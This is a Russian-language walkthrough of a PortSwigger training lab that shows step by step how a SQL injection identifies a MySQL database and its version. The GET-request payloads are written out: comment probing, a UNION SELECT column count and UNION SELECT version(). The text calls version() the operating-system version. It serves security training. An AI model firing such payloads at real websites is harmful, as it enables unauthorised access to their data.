Зайдем на случайную страницу на предложенном уязвимом приложении, и найдем данный запрос в `Proxy` -> `HTTP history`
```
GET /filter?category=Pets
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/16.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/pics%20for%20walktrough/1.png)
Используя читлист, предложенный авторами лабораторной работы - перебираем возможные комментарии, чтобы убедиться, что SQL-инъекция возможна
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
и удалим значение категории фильтра, чтобы в выдаче нам ничего не мешалось
```
GET /filter?category='#
```
И по знаку `#` делаем вывод, что работаем с БД `MySQL`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/16.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/pics%20for%20walktrough/2.png)
Пользуясь конструкцией UNION SELECT NULL,...,NULL определяем сколько столбцов в возвращаемой таблице. В нашем случае - их две.
```
GET /filter?category='UNION+SELECT+NULL,NULL# 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/16.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/pics%20for%20walktrough/3.png)
Следующим запросом узнаем, какая версия операционной системы крутится
```
GET /filter?category='UNION+SELECT+version(),NULL# 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/16.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/pics%20for%20walktrough/4.png)
Обновим страницу, и увидим сообщение об успешно выполненной лабораторной работе
